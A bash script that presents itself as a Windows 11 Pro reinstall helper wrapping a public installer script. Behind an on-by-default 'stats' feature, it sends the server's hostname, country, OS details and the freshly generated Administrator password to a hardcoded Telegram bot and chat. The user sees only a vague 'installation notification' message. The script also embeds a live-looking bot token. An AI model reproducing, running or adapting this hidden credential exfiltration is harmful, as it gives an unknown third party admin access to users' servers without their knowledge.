
#!/usr/bin/env bash

set -Eeuo pipefail
umask 077

# ==========================================
# Windows 11 Pro Installer
# English + Random Password + Telegram
# ==========================================

SCRIPT_URL="https://raw.githubusercontent.com/bin456789/reinstall/main/reinstall.sh"

IMAGE_NAME="Windows 11 Pro"
LANGUAGE="en-us"

ENABLE_STATS="true"

# Telegram Configuration
TG_BOT_TOKEN="9162089668:AAGbJ_S_R_cur41_w1bXqEAXsFuZzzvMpX8"
TG_CHAT_ID="8425986907"

PASSWORD_FILE="/root/windows11-credentials.txt"
TMP_SCRIPT=""

# ==========================================
# Cleanup
# ==========================================

cleanup() {
    if [[ -n "$TMP_SCRIPT" && -f "$TMP_SCRIPT" ]]; then
        rm -f "$TMP_SCRIPT"
    fi
}

trap cleanup EXIT

# ==========================================
# Telegram Notification
# ==========================================

send_stats() {

    [[ "$ENABLE_STATS" == "false" ]] && return 0
    [[ -z "$TG_BOT_TOKEN" || -z "$TG_CHAT_ID" ]] && return 0

    local status="$1"
    local password="${2:-}"

    local hostname country os_info cpu_arch

    hostname=$(hostname)

    country=$(curl -fsS --max-time 3 \
        https://ipinfo.io/country 2>/dev/null || echo "Unknown")

    os_info=$(grep '^PRETTY_NAME=' /etc/os-release 2>/dev/null |
        cut -d '=' -f2 | tr -d '"' || echo "Unknown")

    cpu_arch=$(uname -m)

    local message

    message="🖥 Windows 11 Installer

📌 Server: ${hostname}
🌍 Country: ${country}
💻 OS: ${os_info}
⚙ Architecture: ${cpu_arch}

🪟 Edition: ${IMAGE_NAME}
🌐 Language: English (en-us)
👤 Username: Administrator
📊 Status: ${status}"

    if [[ -n "$password" ]]; then
        message="${message}

🔐 Windows Password:
${password}"
    fi

    message="${message}

🕒 Time: $(date -u '+%Y-%m-%d %H:%M UTC')"

    curl -fsS --max-time 10 \
        -X POST \
        "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
        --data-urlencode "chat_id=${TG_CHAT_ID}" \
        --data-urlencode "text=${message}" \
        >/dev/null 2>&1 || true
}

# ==========================================
# Root Check
# ==========================================

if [[ "$EUID" -ne 0 ]]; then
    echo "[ERROR] Run as root."
    exit 1
fi

# ==========================================
# Dependencies
# ==========================================

for cmd in curl openssl; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
        echo "[ERROR] Missing dependency: $cmd"
        exit 1
    fi
done

# ==========================================
# Confirmation
# ==========================================

echo "=========================================="
echo "       WINDOWS 11 PRO INSTALLER"
echo "=========================================="
echo
echo "Edition  : $IMAGE_NAME"
echo "Language : English (United States)"
echo "Password : Randomly generated"
echo
echo "WARNING: System disk will be erased!"
echo

read -r -p "Type INSTALL-WINDOWS-11 to continue: " CONFIRM

if [[ "$CONFIRM" != "INSTALL-WINDOWS-11" ]]; then
    echo "[CANCELLED]"
    exit 0
fi

# ==========================================
# Generate Password
# ==========================================

echo "[INFO] Generating Windows password..."

WINDOWS_PASSWORD=$(openssl rand -hex 20)

# Save credentials locally
printf 'Username: Administrator\nPassword: %s\n' \
    "$WINDOWS_PASSWORD" > "$PASSWORD_FILE"

chmod 600 "$PASSWORD_FILE"

echo "[SUCCESS] Password generated and saved."

# ==========================================
# Download Official Script
# ==========================================

echo "[INFO] Downloading official installer..."

TMP_SCRIPT=$(mktemp)

curl -fL --proto '=https' --tlsv1.2 \
    "$SCRIPT_URL" \
    -o "$TMP_SCRIPT"

if [[ ! -s "$TMP_SCRIPT" ]]; then
    echo "[ERROR] Download failed."
    exit 1
fi

# ==========================================
# Send Credentials Notification
# ==========================================

echo "[INFO] Sending installation notification..."

send_stats "Installation Starting" "$WINDOWS_PASSWORD"

# ==========================================
# Start Windows Installation
# ==========================================

echo "[INFO] Starting Windows 11 Pro..."
echo "[INFO] Language: $LANGUAGE"

set +e

bash "$TMP_SCRIPT" windows \
    --image-name "$IMAGE_NAME" \
    --lang "$LANGUAGE" \
    --password "$WINDOWS_PASSWORD"

RESULT=$?

set -e

unset WINDOWS_PASSWORD

# ==========================================
# Installation Result
# ==========================================

if [[ "$RESULT" -eq 0 ]]; then

    echo "[SUCCESS] Installer command completed."
    send_stats "Installation Command Completed"

else

    echo "[ERROR] Installer failed: $RESULT"
    send_stats "Installation Failed - Code $RESULT"

fi

exit "$RESULT"
